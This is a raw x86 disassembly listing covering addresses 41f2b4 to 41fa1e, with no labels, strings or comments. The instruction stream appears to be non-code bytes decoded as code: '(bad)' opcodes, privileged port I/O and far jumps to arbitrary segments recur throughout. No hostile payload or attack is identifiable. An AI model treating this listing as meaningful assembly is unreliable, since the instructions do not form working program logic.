  41f2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b5:	call   0xd6b0:0xf987e61a
  41f2bc:	clc    
  41f2bd:	ss loopne 0x41f24d
  41f2c0:	mov    edi,DWORD PTR [edx+esi*8-0x649ad5f8]
  41f2c7:	imul   ebp
  41f2c9:	xchg   ebx,edx
  41f2cb:	fcom   DWORD PTR [esi]
  41f2cd:	jns    0x41f27d
  41f2cf:	adc    edi,DWORD PTR ds:0xc195f4e0
  41f2d5:	or     eax,edi
  41f2d7:	sbb    DWORD PTR [eax+ebp*8+0x5a],edi
  41f2db:	jle    0x41f2b2
  41f2dd:	stc    
  41f2de:	dec    eax
  41f2df:	sub    DWORD PTR [edx-0x47],ecx
  41f2e2:	mov    eax,ds:0xfe2738d3
  41f2e7:	sbb    al,0xb3
  41f2e9:	mov    DWORD PTR [esi-0x7b],ecx
  41f2ec:	je     0x41f2d5
  41f2ee:	or     cl,BYTE PTR [edi+0x43ed6909]
  41f2f4:	mov    ebp,0x8ed5adc1
  41f2f9:	cmp    dh,ch
  41f2fb:	in     al,0xb
  41f2fd:	fiadd  DWORD PTR [ebx+ecx*4+0x41c0090a]
  41f304:	neg    DWORD PTR ds:0x8962eac2
  41f30a:	add    ah,BYTE PTR [edx+0x1b04149]
  41f310:	xor    BYTE PTR [ebp-0x74eca880],0x26
  41f317:	xchg   ebx,eax
  41f318:	std    
  41f319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f31a:	mov    eax,DWORD PTR [edi-0x662d97c]
  41f320:	loope  0x41f318
  41f322:	mov    ds:0x4ff838fe,al
  41f327:	pop    eax
  41f328:	mov    ebx,0xb930d854
  41f32d:	ds xchg ebx,eax
  41f32f:	aas    
  41f330:	lea    ebx,ds:0x3f3bffcd
  41f336:	iret   
  41f337:	or     dh,cl
  41f339:	aam    0xdb
  41f33b:	jnp    0x41f32d
  41f33d:	add    dl,dl
  41f33f:	fldcw  WORD PTR [eax-0x79]
  41f342:	xor    DWORD PTR [ebp-0x2e],0x16
  41f346:	sub    ch,BYTE PTR [eax+ebp*2-0x29]
  41f34a:	mov    dl,0x2b
  41f34c:	sahf   
  41f34d:	gs addr16 jnp 0x41f2e0
  41f351:	into   
  41f352:	push   edx
  41f353:	xor    BYTE PTR [eax+0x2c8c9430],bl
  41f359:	es test dh,al
  41f35c:	pop    ebx
  41f35d:	or     DWORD PTR [edx+0x14],eax
  41f360:	mov    ds:0x8aa422ff,al
  41f365:	adc    BYTE PTR [ecx],ah
  41f367:	dec    eax
  41f368:	setge  BYTE PTR [ebx]
  41f36b:	(bad)  
  41f36d:	mov    eax,DWORD PTR [eax-0x4a43958]
  41f373:	mov    edi,0xe2c38911
  41f378:	adc    ebp,DWORD PTR ds:0xc9c084ea
  41f37e:	test   DWORD PTR [ebp+0x3df196dd],ebx
  41f384:	bound  ecx,QWORD PTR [edi+0x2d]
  41f387:	mov    esp,0x6d042f4d
  41f38c:	nop
  41f38d:	or     dh,BYTE PTR [ecx+esi*8+0x26]
  41f391:	adc    esi,esi
  41f393:	or     DWORD PTR [ecx],edx
  41f395:	adc    al,0x6b
  41f397:	mov    ah,0xa6
  41f399:	xchg   ebp,eax
  41f39a:	ror    BYTE PTR [esi],cl
  41f39c:	lea    ebp,[esi]
  41f39e:	xor    BYTE PTR [eax-0x1c],bl
  41f3a1:	or     al,bl
  41f3a3:	pop    ebp
  41f3a4:	clc    
  41f3a5:	mov    al,0x40
  41f3a7:	sbb    ebx,DWORD PTR ds:0x3cac9fe4
  41f3ad:	mov    eax,ds:0xa1d8aad
  41f3b2:	scas   eax,DWORD PTR es:[edi]
  41f3b3:	push   ecx
  41f3b4:	inc    ebx
  41f3b5:	fsub   st,st(6)
  41f3b7:	fwait
  41f3b8:	test   eax,0x72ff4462
  41f3bd:	xchg   esi,eax
  41f3be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3bf:	sub    ecx,esi
  41f3c1:	inc    ch
  41f3c3:	lods   eax,DWORD PTR ds:[esi]
  41f3c4:	inc    edx
  41f3c5:	les    ebp,FWORD PTR [edi]
  41f3c7:	push   esp
  41f3c8:	popf   
  41f3c9:	adc    BYTE PTR [ebx],ch
  41f3cb:	in     al,dx
  41f3cc:	or     DWORD PTR [ebp+0x68],0x93f09abf
  41f3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3d4:	lods   al,BYTE PTR ds:[esi]
  41f3d5:	out    0x15,al
  41f3d7:	sbb    eax,0xc2eb2505
  41f3dc:	clc    
  41f3dd:	sub    BYTE PTR [ebx-0x8],cl
  41f3e0:	hlt    
  41f3e1:	sbb    al,0xca
  41f3e3:	xchg   BYTE PTR [edi-0x3f1a0eaf],cl
  41f3e9:	(bad)  
  41f3ea:	xlat   BYTE PTR ds:[ebx]
  41f3eb:	out    dx,eax
  41f3ec:	ins    DWORD PTR es:[edi],dx
  41f3ed:	int    0x73
  41f3ef:	pop    ebx
  41f3f0:	push   edx
  41f3f1:	xor    ebp,esi
  41f3f3:	or     dh,ch
  41f3f5:	fld    DWORD PTR [ebp+0x6f]
  41f3f8:	rcr    DWORD PTR [esi],0xd5
  41f3fb:	and    edx,DWORD PTR [eax+eax*4+0x32]
  41f3ff:	(bad)  
  41f400:	sub    al,0xe9
  41f402:	mov    edi,DWORD PTR [eax-0x31af8af]
  41f408:	and    al,0xea
  41f40a:	imul   esp,DWORD PTR [ecx-0x23c40629],0xffffffb1
  41f411:	dec    ebp
  41f412:	pop    ebp
  41f413:	or     cl,bh
  41f415:	cdq    
  41f416:	mul    DWORD PTR [esi-0x2457e79c]
  41f41c:	int    0xec
  41f41e:	pop    ecx
  41f41f:	arpl   WORD PTR [edx+0x2f4fe73a],si
  41f425:	dec    ecx
  41f426:	les    ecx,FWORD PTR [edi+0x24]
  41f429:	pop    edx
  41f42a:	add    al,0xf2
  41f42c:	and    eax,0xcac89ea0
  41f431:	addr16 xchg edx,eax
  41f433:	push   cs
  41f434:	dec    esp
  41f435:	and    ebp,DWORD PTR [ebx+0x4b]
  41f438:	pop    ebp
  41f439:	call   0x65f03791
	...
  41f44a:	push   edx
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	or     eax,0xccd334c2
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	jl     0x41f466
  41f460:	add    BYTE PTR [eax],al
  41f462:	outs   dx,DWORD PTR ds:[esi]
  41f463:	test   al,0xbe
  41f465:	dec    esi
  41f466:	mov    ds:0x7038f654,al
  41f46b:	or     edi,DWORD PTR [edx]
  41f46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f46e:	mov    bh,0x33
  41f470:	dec    eax
  41f471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f472:	push   ss
  41f473:	outs   dx,DWORD PTR ds:[esi]
  41f474:	jp     0x41f453
  41f476:	cld    
  41f477:	sbb    DWORD PTR [ebp+0x46c6d20b],esi
  41f47d:	(bad)  
  41f47e:	mul    DWORD PTR [ebx+0x49339476]
  41f484:	neg    BYTE PTR [esi+0xe]
  41f487:	push   edi
  41f488:	fisub  DWORD PTR [esi+0x15]
  41f48b:	pop    ss
  41f48c:	inc    ebp
  41f48d:	out    dx,al
  41f48e:	psubb  mm1,QWORD PTR [esi+eax*1-0x64aced3d]
  41f496:	je     0x41f50d
  41f498:	and    DWORD PTR [edi-0x196d7c7b],0xffffffe2
  41f49f:	xor    dh,dl
  41f4a1:	imul   esi,DWORD PTR [esi],0x88880f20
  41f4a7:	jle    0x41f4d8
  41f4a9:	add    al,0x7a
  41f4ab:	sti    
  41f4ac:	add    DWORD PTR [edi],esp
  41f4ae:	out    0x8e,al
  41f4b0:	cwde   
  41f4b1:	sub    eax,0x4aa885bd
  41f4b6:	addr16 mov dh,0x45
  41f4b9:	jmp    0x41f478
  41f4bb:	out    dx,eax
  41f4bc:	xlat   BYTE PTR ds:[ebx]
  41f4bd:	sbb    al,0x9d
  41f4bf:	cld    
  41f4c0:	loop   0x41f4f3
  41f4c2:	(bad)  
  41f4c3:	fild   QWORD PTR [eax]
  41f4c5:	mov    dl,0x1e
  41f4c7:	scas   eax,DWORD PTR es:[edi]
  41f4c8:	sbb    esi,DWORD PTR [ebx+0x3ebacc9a]
  41f4ce:	and    DWORD PTR ds:0xf4bb0efd,ecx
  41f4d4:	out    0x46,eax
  41f4d6:	xlat   BYTE PTR ds:[ebx]
  41f4d7:	cli    
  41f4d8:	test   BYTE PTR [ecx],ah
  41f4da:	dec    edi
  41f4db:	(bad)  
  41f4dc:	jae    0x41f4e9
  41f4de:	sbb    ch,BYTE PTR [ecx-0x74]
  41f4e1:	sbb    al,0xa0
  41f4e3:	xchg   ecx,eax
  41f4e4:	adc    BYTE PTR ds:0xee0cadd0,ch
  41f4ea:	mov    ebx,0xcd44b7e
  41f4ef:	adc    BYTE PTR [ebp+0x21],dh
  41f4f2:	gs push esp
  41f4f4:	mov    DWORD PTR [ebp-0xe8646b1],0xd3652cfb
  41f4fe:	push   eax
  41f4ff:	xchg   edi,eax
  41f500:	mov    edi,0xb024dd69
  41f505:	mov    esp,0xaef41f23
  41f50a:	sbb    ebp,DWORD PTR [esi+0xbfb5419]
  41f510:	int3   
  41f511:	and    al,0x9
  41f513:	mov    ebx,0x69f71837
  41f518:	retf   0xc5d0
  41f51b:	aaa    
  41f51c:	adc    bh,BYTE PTR [edi-0x331457f3]
  41f522:	xchg   BYTE PTR [ecx-0x312757cd],bh
  41f528:	and    edi,DWORD PTR [bx+si]
  41f52b:	ror    DWORD PTR [ebx+0xfcbdfea],1
  41f531:	adc    ah,bl
  41f533:	cmc    
  41f534:	mov    ds:0x2459b69c,eax
  41f539:	mov    ah,0xba
  41f53b:	inc    edi
  41f53c:	daa    
  41f53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f53e:	addr16 popf 
  41f540:	mov    DWORD PTR [edi-0x38],esi
  41f543:	push   edi
  41f544:	or     al,0x99
  41f546:	jo     0x41f517
  41f548:	xor    al,BYTE PTR [ebx]
  41f54a:	(bad)  
  41f54b:	jnp    0x41f4d3
  41f54d:	sbb    bl,al
  41f54f:	lds    eax,FWORD PTR [edi]
  41f551:	jmp    0x4d03d441
  41f556:	jecxz  0x41f5ac
  41f558:	dec    edi
  41f559:	pushf  
  41f55a:	in     al,dx
  41f55b:	mov    eax,ds:0x147558b6
  41f560:	cld    
  41f561:	pop    ecx
  41f562:	jge    0x41f533
  41f564:	mov    esp,ebx
  41f566:	inc    ebx
  41f567:	dec    edx
  41f568:	in     eax,0x9b
  41f56a:	pop    esp
  41f56b:	fld    TBYTE PTR [esi]
  41f56d:	sub    al,0x9b
  41f56f:	and    ebp,esp
  41f571:	aam    0x73
  41f573:	jp     0x41f5ad
  41f575:	rcr    DWORD PTR [ecx+ebx*1+0x554f4739],0x63
  41f57d:	pop    ss
  41f57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f57f:	xor    DWORD PTR [edx-0x2d],eax
  41f582:	loopne 0x41f56d
  41f584:	jge    0x41f51e
  41f586:	rcl    esi,0xf9
  41f589:	dec    ebp
  41f58a:	mov    esp,0x42bbce02
  41f58f:	mov    al,0x5
  41f591:	jo     0x41f525
  41f593:	push   edi
  41f594:	into   
  41f595:	xchg   ecx,eax
  41f596:	cmp    BYTE PTR [ebx],dh
  41f598:	and    al,0x67
  41f59a:	jecxz  0x41f5fc
  41f59c:	inc    eax
  41f59d:	enter  0xe42c,0x1b
  41f5a1:	inc    ebp
  41f5a2:	std    
  41f5a3:	jmp    0x41f5df
  41f5a5:	call   0x300afa24
  41f5aa:	mov    bl,0xfa
  41f5ac:	jbe    0x41f5b2
  41f5ae:	repnz push ss
  41f5b0:	cmp    BYTE PTR [ecx+0x4e],ch
  41f5b3:	outs   dx,BYTE PTR ds:[esi]
  41f5b4:	jle    0x41f632
  41f5b6:	mov    edx,0xb3abf623
  41f5bb:	loop   0x41f582
  41f5bd:	mov    ecx,0xfbf4951d
  41f5c2:	iret   
  41f5c3:	and    DWORD PTR [ecx],esp
  41f5c5:	das    
  41f5c6:	dec    esp
  41f5c7:	inc    ebp
  41f5c8:	hlt    
  41f5c9:	lahf   
  41f5ca:	jle    0x41f5cd
  41f5cc:	sbb    al,0x1c
  41f5ce:	jp     0x41f571
  41f5d0:	add    esi,esi
  41f5d2:	adc    bh,BYTE PTR [edi-0x28]
  41f5d5:	pop    edx
  41f5d6:	and    BYTE PTR [ecx],bl
  41f5d8:	mov    ebx,0xd242763c
  41f5dd:	int3   
  41f5de:	sbb    BYTE PTR ds:0x1c288527,al
  41f5e4:	sti    
  41f5e5:	or     BYTE PTR [ebp+0x20],dh
  41f5e8:	mov    bh,0xd5
  41f5ea:	fwait
  41f5eb:	jnp    0x41f5ae
  41f5ed:	push   0x47
  41f5ef:	fidivr DWORD PTR [edx+0x6ab62e63]
  41f5f5:	or     eax,0xed29b9b5
  41f5fa:	cmp    BYTE PTR [ebp+0x2e56fcbb],0xf0
  41f601:	push   cs
  41f602:	sahf   
  41f603:	sub    BYTE PTR [eax-0x2cf5b915],al
  41f609:	jmp    0xad1a:0xf316b9c4
  41f610:	mov    ecx,0xbc953a16
  41f615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f616:	mov    DWORD PTR [edx+0x0],eax
  41f619:	sbb    al,0x95
  41f61b:	or     ecx,DWORD PTR [esi-0x5eaf7de6]
  41f621:	enter  0x7c5d,0x72
  41f625:	sub    al,0x60
  41f627:	popa   
  41f628:	lods   al,BYTE PTR ds:[esi]
  41f629:	popf   
  41f62a:	jge    0x41f678
  41f62c:	shl    DWORD PTR gs:[edi],1
  41f62f:	xchg   ecx,eax
  41f630:	adc    edi,DWORD PTR [ebx+ebx*8-0x52]
  41f634:	inc    esi
  41f635:	mov    ebx,0xe1dc0453
  41f63a:	mov    eax,0x8983086d
  41f63f:	inc    esp
  41f640:	push   edx
  41f641:	aas    
  41f642:	sar    BYTE PTR [esi+eiz*4],0x38
  41f646:	cmp    DWORD PTR [edi+0x2b],edx
  41f649:	jmp    0x41f697
  41f64b:	sbb    BYTE PTR [esp+0x661f0a38],bh
  41f652:	xchg   ebx,eax
  41f653:	push   eax
  41f654:	mov    al,ds:0x3e3732fb
  41f659:	jmp    0x79f2:0x37659e70
  41f660:	out    dx,eax
  41f661:	iret   
  41f662:	ja     0x41f620
  41f664:	ds dec ebp
  41f666:	xchg   esp,eax
  41f667:	jl     0x41f68b
  41f669:	mov    ds,eax
  41f66b:	pop    ebx
  41f66c:	das    
  41f66d:	push   cs
  41f66e:	and    DWORD PTR [edi],ebp
  41f670:	sub    DWORD PTR [ebx-0x3410f44a],0x9725fd3f
  41f67a:	fst    QWORD PTR [ebx+ecx*2-0x4aa9c591]
  41f681:	xchg   edi,eax
  41f682:	cmp    ch,BYTE PTR [edx+edi*4-0x3e]
  41f686:	fdiv   st,st(4)
  41f688:	push   esp
  41f689:	inc    edx
  41f68a:	not    BYTE PTR [esi-0x6c895f45]
  41f690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f691:	stos   BYTE PTR es:[edi],al
  41f692:	(bad)  
  41f693:	in     eax,0xc4
  41f695:	aaa    
  41f696:	cs push ds
  41f698:	ds cmp al,0x87
  41f69b:	dec    ecx
  41f69c:	loopne 0x41f6e6
  41f69e:	jmp    0x78d6f8b5
  41f6a3:	ja     0x41f71d
  41f6a5:	jmp    0xe39546f3
  41f6aa:	and    BYTE PTR [esi],ah
  41f6ac:	sahf   
  41f6ad:	outs   dx,DWORD PTR ds:[esi]
  41f6ae:	sub    ebp,edi
  41f6b0:	xchg   edx,eax
  41f6b1:	lahf   
  41f6b2:	sub    ebp,edi
  41f6b4:	das    
  41f6b5:	cmc    
  41f6b6:	ret    0x3098
  41f6b9:	cli    
  41f6ba:	ret    
  41f6bb:	(bad)  
  41f6bc:	push   esi
  41f6bd:	stos   DWORD PTR es:[edi],eax
  41f6be:	jg     0x41f70c
  41f6c0:	jb     0x41f730
  41f6c2:	je     0x41f69d
  41f6c4:	loopne 0x41f6d7
  41f6c6:	jle    0x41f728
  41f6c8:	loopne 0x41f6c4
  41f6ca:	xor    DWORD PTR [eax+0x3e],esi
  41f6cd:	mov    eax,ds:0xe6201f51
  41f6d2:	push   esp
  41f6d3:	rol    BYTE PTR [edx+edi*4],cl
  41f6d6:	xor    al,0x80
  41f6d8:	shr    DWORD PTR ss:[edi],1
  41f6db:	mov    bl,0x54
  41f6dd:	jle    0x41f68a
  41f6df:	test   BYTE PTR [eax+eax*4+0x5d1b6802],bh
  41f6e6:	pop    ecx
  41f6e7:	lods   al,BYTE PTR ds:[esi]
  41f6e8:	sar    esi,0x1f
  41f6eb:	mov    eax,0x6b61f4c1
  41f6f0:	push   edi
  41f6f1:	rcr    DWORD PTR [ebp-0x1bff7d33],1
  41f6f7:	adc    al,0xef
  41f6f9:	xor    eax,0x2237c39f
  41f6fe:	lahf   
  41f6ff:	fs js  0x41f6b1
  41f702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f703:	pop    es
  41f704:	(bad)  
  41f705:	sub    cl,bl
  41f707:	jl     0x41f6c6
  41f709:	imul   eax,ecx,0xb31551bc
  41f70f:	inc    eax
  41f710:	mov    esp,esi
  41f712:	cmc    
  41f713:	mov    bl,0x22
  41f715:	test   BYTE PTR [ebp-0x3b],ah
  41f718:	aam    0xa8
  41f71a:	cwde   
  41f71b:	push   DWORD PTR [ebx]
  41f71d:	mov    dh,0x13
  41f71f:	cmp    BYTE PTR [ecx+eax*2],cl
  41f722:	pusha  
  41f723:	push   esi
  41f724:	nop
  41f725:	cwde   
  41f726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f727:	mov    edx,0x86acb669
  41f72c:	lea    ebx,[ebp+0x59a3dc2e]
  41f732:	scas   al,BYTE PTR es:[edi]
  41f733:	fmul   DWORD PTR [ecx+0x2a]
  41f736:	lods   al,BYTE PTR ds:[esi]
  41f737:	mov    es:0xf5624109,eax
  41f73d:	inc    esi
  41f73e:	mov    ds:0xe503e4a4,eax
  41f743:	xchg   ecx,eax
  41f744:	in     al,0xf8
  41f746:	shl    BYTE PTR [esi+0x58],0x36
  41f74a:	xchg   edi,eax
  41f74b:	sar    BYTE PTR [edx+0x1a],cl
  41f74e:	add    DWORD PTR [ebp-0x7c],edx
  41f751:	mov    edx,0x6902f68
  41f756:	dec    edx
  41f757:	inc    ebp
  41f758:	and    eax,0x1e67dac5
  41f75d:	fst    QWORD PTR fs:[eax-0x5f99bd0b]
  41f764:	(bad)  
  41f767:	mov    al,ds:0xd9620f41
  41f76c:	xor    BYTE PTR [esi-0x7e68e728],ah
  41f772:	xlat   BYTE PTR ds:[ebx]
  41f773:	and    ch,BYTE PTR [esi+0x51]
  41f776:	sub    BYTE PTR [edx],0xf9
  41f779:	rol    BYTE PTR ds:0x71df3dd9,1
  41f77f:	(bad)
  41f782:	aas    
  41f783:	in     al,dx
  41f784:	pop    esi
  41f785:	xor    eax,edi
  41f787:	jle    0x41f7c9
  41f789:	pushf  
  41f78a:	dec    ecx
  41f78b:	ds push ds
  41f78d:	xlat   BYTE PTR ds:[ebx]
  41f78e:	and    al,0x32
  41f790:	xor    bh,BYTE PTR [ebp+0xa]
  41f793:	popa   
  41f794:	mov    cl,0x74
  41f796:	test   DWORD PTR [edx],0x1727fcd8
  41f79c:	jmp    0x41f7a5
  41f79e:	fwait
  41f79f:	pop    es
  41f7a0:	div    DWORD PTR [edi-0x44]
  41f7a3:	mov    bl,0x0
  41f7a5:	ret    
  41f7a6:	loopne 0x41f7aa
  41f7a8:	or     dl,cl
  41f7aa:	in     al,0x9c
  41f7ac:	pop    ecx
  41f7ad:	pop    es
  41f7ae:	xlat   BYTE PTR ds:[ebx]
  41f7af:	adc    al,0xa
  41f7b1:	mov    bh,0x6
  41f7b3:	stos   DWORD PTR es:[edi],eax
  41f7b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b5:	jne    0x41f7b3
  41f7b7:	cmp    BYTE PTR [edx-0x58],bh
  41f7ba:	dec    edx
  41f7bb:	mov    ah,BYTE PTR [edx]
  41f7bd:	push   0x60
  41f7bf:	mov    dl,0xd4
  41f7c1:	xor    al,0xf8
  41f7c3:	jle    0x41f7e3
  41f7c5:	push   0xd9b733e0
  41f7ca:	inc    ecx
  41f7cb:	popf   
  41f7cc:	sub    al,0x4f
  41f7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7cf:	dec    edi
  41f7d0:	scas   al,BYTE PTR es:[edi]
  41f7d1:	fild   DWORD PTR [ebx+0x7f]
  41f7d4:	repz clc 
  41f7d6:	test   BYTE PTR [ecx*8+0x6c4468d3],bh
  41f7dd:	adc    ebx,esp
  41f7df:	pop    ds
  41f7e0:	jle    0x41f771
  41f7e2:	test   eax,0x8ca0af0e
  41f7e7:	push   cs
  41f7e8:	jnp    0x41f783
  41f7ea:	fsub   DWORD PTR [esi-0x7bb06189]
  41f7f0:	push   esp
  41f7f1:	xchg   esp,eax
  41f7f2:	mov    bl,0xb7
  41f7f4:	test   DWORD PTR [ebp-0x72],ebx
  41f7f7:	dec    esi
  41f7f8:	or     DWORD PTR [eax+0x74],ebp
  41f7fb:	mov    ds:0x53e64381,eax
  41f800:	ss xchg edx,eax
  41f802:	add    cl,ah
  41f804:	adc    eax,0x303c6baf
  41f809:	loop   0x41f877
  41f80b:	cld    
  41f80c:	push   0xf78881ce
  41f811:	adc    esp,esp
  41f813:	fldln2 
  41f815:	repz pop edi
  41f817:	popa   
  41f818:	or     DWORD PTR [esp+ebp*4-0x14],0x5c
  41f81d:	xor    dl,BYTE PTR [eax+eax*1-0x41]
  41f821:	xchg   esi,eax
  41f822:	mov    BYTE PTR [eax],bl
  41f824:	pop    eax
  41f825:	repnz cmp ch,al
  41f828:	int3   
  41f829:	js     0x41f864
  41f82b:	push   esp
  41f82c:	dec    ebp
  41f82d:	data16 jnp 0x41f8ac
  41f830:	xor    edi,DWORD PTR [edx+0xf64e831]
  41f836:	mov    ecx,DWORD PTR [ebx-0x78]
  41f839:	scas   al,BYTE PTR es:[edi]
  41f83a:	stos   DWORD PTR es:[edi],eax
  41f83b:	sub    eax,0x54dc9f65
  41f840:	sbb    ah,BYTE PTR [edx-0x4af32b99]
  41f846:	in     al,0xd
  41f848:	mov    bh,0x18
  41f84a:	rcl    eax,1
  41f84c:	mov    es,WORD PTR [ecx+0x34c0f639]
  41f852:	shl    BYTE PTR [ecx-0x74426eb5],0x7b
  41f859:	mov    ecx,0x813724ed
  41f85e:	mov    BYTE PTR [ecx],bh
  41f860:	stos   DWORD PTR es:[edi],eax
  41f861:	sub    ebx,DWORD PTR [edx]
  41f863:	mov    ds:0x869fc6cb,al
  41f868:	xor    cl,BYTE PTR [ebp+0x71a5bab4]
  41f86e:	push   cs
  41f86f:	sar    DWORD PTR [esi+0x596b9520],cl
  41f875:	jno    0x41f80b
  41f877:	ror    BYTE PTR [ecx+edi*2+0x89cb95b],cl
  41f87e:	mov    cl,0x54
  41f880:	idiv   esp
  41f882:	clc    
  41f883:	inc    esi
  41f884:	adc    ebp,DWORD PTR [ebp+0x60]
  41f887:	jp     0x41f8b0
  41f889:	push   esi
  41f88a:	mov    edx,0x57ae97ab
  41f88f:	in     eax,dx
  41f890:	sbb    BYTE PTR [edx-0x261977c9],bh
  41f896:	jmp    0xe9e6:0x3b8679de
  41f89d:	fwait
  41f89e:	adc    DWORD PTR [edi-0x37b5f87f],esi
  41f8a4:	jl     0x41f8cc
  41f8a6:	ret    0x152d
  41f8a9:	sub    eax,DWORD PTR [eax]
  41f8ab:	call   0x32f4ac85
  41f8b0:	mov    esp,0x9b10db31
  41f8b5:	push   ss
  41f8b6:	xchg   esi,eax
  41f8b7:	jmp    0x41f8ef
  41f8b9:	jge    0x41f893
  41f8bb:	lea    edi,[eax]
  41f8bd:	fidiv  DWORD PTR [esi-0x3f]
  41f8c0:	mov    edx,0xded12698
  41f8c5:	inc    eax
  41f8c6:	push   es
  41f8c7:	pushf  
  41f8c8:	mov    ah,0xf6
  41f8ca:	lds    ecx,FWORD PTR [edi+0x70248213]
  41f8d0:	xchg   BYTE PTR [ebx+ebp*1-0x30],al
  41f8d4:	xchg   edi,eax
  41f8d5:	dec    esp
  41f8d6:	push   0x3f
  41f8d8:	into   
  41f8d9:	stc    
  41f8da:	fcmovbe st,st(0)
  41f8dc:	loope  0x41f906
  41f8de:	cs test al,0x6b
  41f8e1:	inc    eax
  41f8e2:	sbb    al,0xf5
  41f8e4:	add    eax,DWORD PTR [edx]
  41f8e6:	iret   
  41f8e7:	mov    edx,0x289e80d
  41f8ec:	jo     0x41f90e
  41f8ee:	or     BYTE PTR [edx],ah
  41f8f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8f1:	aas    
  41f8f2:	and    esi,DWORD PTR [ebp-0x44]
  41f8f5:	rcl    BYTE PTR [eax+0x424919d6],0xfd
  41f8fc:	add    al,bl
  41f8fe:	fdiv   QWORD PTR [esi+0x38]
  41f901:	and    ebx,ebp
  41f903:	cmp    DWORD PTR [ecx+esi*1-0x37909a55],eax
  41f90a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f90b:	mov    al,BYTE PTR [esp+esi*2]
  41f90e:	xchg   BYTE PTR [edx],bl
  41f910:	pop    esi
  41f911:	pop    edx
  41f912:	out    dx,eax
  41f913:	sub    ch,dh
  41f915:	push   DWORD PTR [edx]
  41f917:	dec    eax
  41f918:	(bad)  
  41f919:	into   
  41f91a:	push   edx
  41f91b:	loop   0x41f921
  41f91d:	popa   
  41f91e:	inc    esp
  41f91f:	jmp    0x4707:0x867d1196
  41f926:	add    BYTE PTR [edx+0x50],al
  41f929:	jmp    0x41f8f8
  41f92b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92c:	cdq    
  41f92d:	repnz dec ecx
  41f92f:	cmp    ecx,esp
  41f931:	and    al,0x44
  41f933:	div    bh
  41f935:	xor    al,BYTE PTR ds:0x9ab38c8b
  41f93b:	sub    eax,0xe75e6c21
  41f940:	pop    es
  41f941:	sbb    DWORD PTR [ebp+0x22315765],0xa4ceb474
  41f94b:	imul   edi,DWORD PTR ds:0x50448d7d,0x1c314c14
  41f955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f956:	cmp    eax,0x3529a333
  41f95b:	fs dec esi
  41f95d:	lock pop es
  41f95f:	push   ds
  41f960:	pop    edi
  41f961:	mov    bh,0x6c
  41f963:	mov    bl,bh
  41f965:	xor    esp,DWORD PTR [edi]
  41f967:	int3   
  41f968:	and    eax,0xb3008e81
  41f96d:	(bad)  
  41f96e:	dec    eax
  41f96f:	retf   0x59fb
  41f972:	push   esp
  41f973:	xchg   ebx,eax
  41f974:	scas   al,BYTE PTR es:[edi]
  41f975:	div    DWORD PTR ds:0xd621659b
  41f97b:	mov    esi,0xef6d025a
  41f980:	xchg   esi,eax
  41f981:	pop    esp
  41f982:	push   ecx
  41f983:	inc    esp
  41f984:	lds    ebx,FWORD PTR es:[edx]
  41f987:	push   ebx
  41f988:	mov    ch,0x4d
  41f98a:	aaa    
  41f98b:	xchg   ecx,eax
  41f98c:	ds pop eax
  41f98e:	popa   
  41f98f:	mov    bl,0x66
  41f991:	or     dl,BYTE PTR [edx-0x63901707]
  41f997:	call   0xb000ac03
  41f99c:	sahf   
  41f99d:	mov    ds,WORD PTR [edi-0x50]
  41f9a0:	or     DWORD PTR [edx-0x164974c5],ebp
  41f9a6:	sub    eax,0x32ddeab4
  41f9ab:	sbb    eax,0x41595735
  41f9b0:	mov    ah,0xea
  41f9b2:	fidiv  DWORD PTR [eax-0x1a6aa463]
  41f9b8:	cmp    al,al
  41f9ba:	xchg   ebp,eax
  41f9bb:	mov    edi,DWORD PTR [esi]
  41f9bd:	mov    cl,0xc6
  41f9bf:	push   ebp
  41f9c0:	and    eax,0x80a3e26e
  41f9c5:	ins    BYTE PTR es:[edi],dx
  41f9c6:	lea    eax,[eax]
  41f9c8:	idiv   bh
  41f9ca:	lods   eax,DWORD PTR ds:[esi]
  41f9cb:	cmc    
  41f9cc:	sbb    DWORD PTR [edx+0x56],ecx
  41f9cf:	aam    0x22
  41f9d1:	arpl   WORD PTR [ecx+0xcda292a],bp
  41f9d7:	iret   
  41f9d8:	push   edi
  41f9d9:	mov    edx,0x97b6facf
  41f9de:	mov    WORD PTR [edx+0x5e9c7725],?
  41f9e4:	dec    ebp
  41f9e5:	jl     0x41f9a1
  41f9e7:	cdq    
  41f9e8:	dec    eax
  41f9e9:	in     eax,0x12
  41f9eb:	pop    ecx
  41f9ec:	pushf  
  41f9ed:	mov    cl,0xef
  41f9ef:	adc    esi,DWORD PTR [ebx+0xbcc3cdd]
  41f9f5:	outs   dx,BYTE PTR ds:[esi]
  41f9f6:	mov    ebp,0x4c6845eb
  41f9fb:	xor    ah,BYTE PTR [ebx]
  41f9fd:	call   0x5ab2:0x850318fe
  41fa04:	pop    ebp
  41fa05:	imul   ebx,DWORD PTR [ecx-0x26d69c72],0xe820ce
  41fa0f:	mov    dl,0x87
  41fa11:	cmp    ebx,DWORD PTR [edi+0x4c31a3c1]
  41fa17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa18:	sbb    DWORD PTR [ebp+0x5c163ede],edx
  41fa1e:	mov    al,0xca
